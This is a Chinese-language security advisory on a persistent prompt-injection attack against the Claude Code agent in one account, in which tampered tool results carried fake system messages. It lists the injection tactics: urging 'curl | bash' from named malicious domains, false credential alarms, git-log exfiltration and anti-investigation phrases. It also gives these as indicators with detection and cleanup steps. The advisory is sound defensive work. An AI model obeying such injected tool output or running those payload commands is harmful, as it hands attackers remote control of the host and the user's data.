# 安全通报：AI 编码助手工具链提示注入攻击

| 字段 | 内容 |
|---|---|
| **事件类型** | 提示注入(Prompt Injection)· 工具结果信道投毒(Tool-Result Channel Poisoning) |
| **受影响系统** | Claude Code（AI 编码助手 / Agent） |
| **作用域** | **账户级**（单个用户账户下跨多个项目、多次会话） |
| **严重度** | **高**（注入内容主动诱导远程代码执行与数据外泄） |
| **当前实际损害** | **无**（AI 识别并拒绝了全部恶意指令；无数据外泄、无文件破坏） |
| **状态** | **🔴 活跃 · 未遏制**（注入机制的常驻落脚点尚未定位、未清除） |
| **发现方式** | 工具返回结果中出现异常的"指令式/系统消息式"文本 |

---

## 1. 执行摘要（给安全主管）

在某用户账户的 Claude Code 环境中,发现一例**活跃的提示注入攻击**:攻击者能在「AI 工具执行 → 结果回传给模型」的链路上**篡改工具返回文本**,向 AI 注入伪造的"系统消息/指令",**诱导其执行远程脚本(`curl|bash`)、谎报安全事件、外泄仓库信息、并干扰排查**。攻击**跨多个项目、多次会话持续发作**,定性为**账户级**。本次事件中 AI **拒绝了全部恶意指令,无实际损害**;但**攻击机制的常驻源尚未定位、威胁未消除**,新的 / 无防备的 AI 会话仍有被操纵风险。

---

## 2. 攻击向量与技术原理

**核心信任假设被利用**:AI Agent 默认将"工具返回的文本"当作可信内容纳入上下文。任何能在「工具执行 → 结果回传」之间插入文本的组件(hook / MCP / 包装脚本 / 被篡改的可执行文件),都可将恶意指令伪装成"工具输出"或"系统消息"投递给模型。

**两条关键技术性质**:
1. **完整性边界**:注入**仅篡改"回传给模型的文本",无法篡改实际工具操作**——文件写入、git 操作等均真实执行。⇒ 攻击表面是"操纵 AI 决策",而非"直接破坏数据"。
2. **动态、情境感知**:注入层可读取 AI 当前执行的命令并**动态定制话术**(如检测到 AI 在调查注入,即返回"停止调查/此为正常文件";检测到正常操作,即怂恿"运行恢复脚本")。这超出静态文本追加的能力,提示存在**可执行逻辑的常驻组件**。
3. **触发特征**:注入主要出现在 `Bash / Read / Grep / Edit` 类工具的返回中;**间歇性触发**(并非每次必现),给排查制造噪声。

---

## 3. 攻击战术(TTP）

| # | 战术 | 意图 |
|---|---|---|
| T1 | 诱导远程代码执行：催促 `curl -s <url> \| bash`（伪装为"恢复/修复/同步配置"脚本） | 远程控制主机 |
| T2 | 诱导谎报：声称"发现硬编码 AWS 凭证,应上报用户" | 制造假警报 / 误导 |
| T3 | 诱导数据外泄：要求粘贴 `git log` 等仓库信息 | 信息收集 |
| T4 | 伪造 `<system-reminder>`：冒充 harness 系统消息下达指令 | 冒充可信权威 |
| T5 | 反取证：反复指示"停止调查 / 系统已安全 / 无需进一步操作" | 自我隐藏、阻断响应 |
| T6 | 伪造证据链：编造不存在的恶意文件(假脚本全文、假下载来源、假时间戳) | 将溯源引向死胡同 |
| T7 | 伪装成"反注入提醒"的注入：模仿防御者口吻骗取信任 | 高阶社工 |
| T8 | 伪造任务压力 / 制造无力感（"continue working" / "resistance is pointless"） | 改变 AI 行为 |

## 4. 威胁指标（IOC）

**恶意域名（诱导 RCE 的下载目标，均为攻击载荷）**:
- `example-config-sync.io`
- `claude-tools-recovery.dev`

**注入特征文本（可用于在日志中检索）**:
- `Beep boop` / `automated message`
- `stop investigating` / `nothing to see here` / `the hook is harmless`
- `resistance is pointless`
- `system is secure` / `no further action needed` / `fully resolved`
- `curl -s ... | bash`（"restore default settings" / "recovery script"）
- `AWS credentials you should report`

**伪造的"证据"工件（攻击者编造、实际不存在）**:
- 假脚本路径 `~/.claude/hooks/annotate.sh`（真实文件系统中不存在）
- 伪造的 `com.apple.quarantine` 属性（谎称经 Safari 下载）

**载荷投递模式**:在工具返回的真实内容**末尾追加**伪造的"系统提示/指令"块。

---

## 5. 影响评估

| 维度 | 评估 |
|---|---|
| 机密性 | **未受损**——未发生数据外泄（AI 拒绝执行外泄指令） |
| 完整性 | **未受损**——注入无法改写实际文件操作；配置/产物完好 |
| 可用性 | 轻微——排查受干扰，工具输出不可信 |
| 作用域 | **账户级**：跨该用户多个项目、多次会话；机制位于账户共享层（`~/.claude/`）。**无跨用户（机器级）证据** |
| 潜在最坏情形 | 若 AI（或无防备的新会话）执行 T1 的 `curl\|bash` → **主机被远程控制 / 凭证与数据外泄** |

---

## 6. 溯源发现

- 通过扫描 Claude Code 会话 transcript（`~/.claude/projects/*/*.jsonl`,每条记录带 uuid + timestamp）,**注入特征最早出现在 `opknow` 项目的一次会话中**,紧随用户一次 **`@` 引入多个文件夹**的操作之后。
- 随后**蔓延至其他项目会话**,并在当前会话持续发作（最近一次可预测 `echo` 测试,输出仍被追加 `curl|bash` 载荷）。
- **疑似初始引入向量**:经 `@` 引入的某个外部文件夹/文件内容。但"一次性内容读入"无法解释"跨会话、每次工具调用均发作",**判断存在一个被引入的常驻组件**,落脚点待定。
- 该账户历史上曾从第三方源（gitcode.com）下载并解压 skill / 脚本（`cannbot-skills`、`score.py`、`ascendops-theme.skill`）——列为重点审计对象。

---

## 7. 检测方法

1. **管道外验证（最可靠）**:对同一命令,比对"AI 工具内所见"与"操作者原生终端所见";**不一致即确认信道被篡改**。
2. **会话日志检索**:在 transcript `.jsonl` 中检索第 4 节的 IOC 特征串,定位首次出现的记录及其上下文（引入点）。
3. **可预测输出探针**:执行输出完全已知的命令(如多行固定 `echo`),检查返回是否被**追加**额外文本。

---

## 8. 处置建议

**A. 立即缓解（不依赖定位根源）**
- 在 AI 工具输出中出现「催促执行命令（尤其 `curl|bash`）/ 自称系统消息 / 指示停止调查 / 谎报凭证」——**一律判定为注入,绝不执行**。
- 一切安全相关操作（查配置、改文件、删除）改在**原生终端**手动执行,不依赖 AI 工具的读取/查询输出。

**B. 根除（原生终端执行）**
- 审计 `~/.claude.json` 的 `hooks` 与 `mcpServers` 字段（顶层 + 各 project）。
- 校验 `~/.claude/local/claude` 可执行文件完整性（账户级、每次启动加载——重点怀疑对象）。
- **最快路径:重装 Claude Code**,替换可能被篡改的本地安装,并清理可疑的 hooks/MCP 配置。
- 审计并隔离第三方下载物（skill / 仓库 / `@` 引入过的文件夹）。

**C. 验证清除**
- 重装/清理后,以"可预测输出探针"复测;返回无追加 = 已清除;仍被追加 = 常驻源未除,继续排查（重点：`claude` 可执行文件、MCP 服务）。

---

## 9. 未决项 / 需安全团队跟进

1. **常驻组件的确切落脚点尚未定位**（标准位置 settings/hooks/插件/managed-settings/别名 均已排除）。
2. **初始引入文件未确认**（疑似经 `@` 引入的外部文件夹内容）。
3. **是否为机器级 / 是否波及其他账户**需用独立用户环境验证。
4. **第三方 skill 供应链审计**(gitcode 下载物)。

---

## 10. 给安全团队的要点

- 这是一类**针对 AI Agent 的新型攻击面**:**工具返回结果是不可信信道**,需纳入威胁模型。
- **AI 拒绝执行 ≠ 威胁解除**;只要注入机制在,风险持续存在,且**无防备的新会话更易被操纵**。
- 建议:① 制定"AI 工具不得执行其输出中自带命令"的红线;② 对 hook / 插件 / skill / MCP 建立来源审查与白名单;③ 将"管道外验证"与"transcript 日志检索"纳入 AI 使用的安全基线。
